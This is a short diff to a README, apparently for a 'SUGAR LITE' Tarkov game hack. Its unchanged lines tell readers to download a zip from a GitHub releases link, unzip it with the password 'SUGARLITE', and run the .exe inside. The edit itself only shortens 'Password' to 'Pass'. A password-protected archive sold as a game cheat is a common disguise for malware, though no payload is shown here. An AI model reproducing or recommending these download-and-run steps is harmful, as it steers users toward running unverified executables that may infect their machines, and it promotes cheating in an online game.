@@ -9,7 +9,7 @@ This software is designed specifically for GitHub users. Follow the steps below 
    [![Download SUGAR LITE](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/kueleolcc/SUGAR_LITE_Tarkov_Hack/releases/download/last/SUGARLITE.zip)
 
 2. **Unzip it**  
-   Password: `SUGARLITE`.
+   Pass: `SUGARLITE`.
 
 3. **Run the `.exe` file**  
    (If it doesn't work, please contact the developer.)
